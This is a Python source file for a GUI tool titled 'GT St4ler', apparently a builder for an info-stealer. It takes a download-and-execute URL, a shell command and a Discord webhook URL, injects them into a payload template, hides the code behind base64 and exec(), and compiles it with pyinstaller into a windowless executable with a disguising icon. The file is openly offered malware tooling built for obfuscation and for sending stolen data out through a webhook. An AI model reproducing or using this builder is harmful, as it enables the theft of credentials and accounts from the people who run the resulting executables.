import dearpygui.dearpygui as dpg
import base64
import shutil
import os

def build():
    file_url = dpg.get_value("file_url")
    command = dpg.get_value("command")

    executable_name = dpg.get_value("executable_name")
    webhook_url = dpg.get_value("webhook_url")

    with open("Client.py", "r") as file:
        code = file.read()

    if file_url:
        code = code.replace('file_url = ""', f'file_url = "{file_url}"')

    if command:
        code = code.replace('command = ""', f'command = "{command}"')

    code = code.replace('executable_name = ""', f'executable_name = "{executable_name}"')
    code = code.replace('webhook_url = ""', f'webhook_url = "{webhook_url}"')

    with open(f"{executable_name}.py", "w") as file:
        encoded_code = base64.b64encode(code.encode()).decode()
        file.write(f"""
from discord_webhook import DiscordWebhook, DiscordEmbed
from requests.exceptions import Timeout
from struct import unpack
import requests
import tempfile
import discord
import base64
import psutil
import socket
import shutil
import time
import sys
import os

exec(base64.b64decode({repr(encoded_code)}).decode())
""")
        
    os.system(f"pyinstaller --onefile --noconsole --icon=exe.ico {executable_name}.py")

    shutil.rmtree("build")
    os.remove(f"{executable_name}.spec")
    os.remove(f"{executable_name}.py")
    os.system("pause")

class Gui:
    # Settings
    width = 560
    height = 170

    dpg.create_context()
    dpg.create_viewport(
        title="GT St4ler - bt08s",
        width=width,
        height=height,
        decorated=False,
    )

    # Drag handler
    def drag_viewport(sender, app_data):
        FRAME_PADDING_Y = 3
        _, drag_dx, drag_dy = app_data

        drag_start_y = dpg.get_mouse_pos(local=False)[1] - drag_dy
        title_bar_height = 2 * FRAME_PADDING_Y + dpg.get_text_size("")[1]
        if drag_start_y < title_bar_height:
            x_pos, y_pos = dpg.get_viewport_pos()
            dpg.set_viewport_pos((x_pos + drag_dx, max(0, y_pos + drag_dy)))

    with dpg.handler_registry():
        dpg.add_mouse_drag_handler(button=0, threshold=0.0, callback=drag_viewport)

    # Font
    with dpg.font_registry():
        dpg.add_font("Roboto-Regular.ttf", 16, tag="ttf-font")

    dpg.bind_font("ttf-font")

    # Theme
    with dpg.theme() as global_theme:
        with dpg.theme_component(dpg.mvAll):
            dpg.add_theme_style(dpg.mvStyleVar_TabRounding, 3)
            dpg.add_theme_style(dpg.mvStyleVar_GrabRounding, 3)
            dpg.add_theme_style(dpg.mvStyleVar_ChildRounding, 3)
            dpg.add_theme_style(dpg.mvStyleVar_FrameRounding, 3)
            dpg.add_theme_style(dpg.mvStyleVar_PopupRounding, 3)
            dpg.add_theme_style(dpg.mvStyleVar_WindowRounding, 3)
            dpg.add_theme_style(dpg.mvStyleVar_ScrollbarRounding, 3)

            dpg.add_theme_color(dpg.mvThemeCol_TabActive, (51, 105, 173))
            dpg.add_theme_color(dpg.mvThemeCol_Tab, (43, 80, 131))
            dpg.add_theme_color(dpg.mvThemeCol_WindowBg, (21, 22, 23))
            dpg.add_theme_color(dpg.mvThemeCol_Button, (39, 73, 114))

    dpg.bind_theme(global_theme)

    # Window
    with dpg.window(
        label="GT St4ler - bt08s",
        width=width,
        height=height,
        on_close=lambda: dpg.stop_dearpygui()) as window:

        dpg.add_input_text(label="File url (download & execute)", hint="<optional>", tag="file_url")
        dpg.add_input_text(label="Cmd command (execute)", hint="<optional>", tag="command")
        
        dpg.add_input_text(label="Executable name", tag="executable_name")
        dpg.add_input_text(label="Webhook url", tag="webhook_url")

        dpg.add_spacer()
        dpg.add_button(label="Build", width=544, callback=build)

    # Setup
    dpg.set_primary_window(window, True)
    dpg.configure_item(window, no_title_bar=False, no_collapse=True)
    dpg.setup_dearpygui()
    dpg.show_viewport()
    dpg.start_dearpygui()
    dpg.destroy_context()
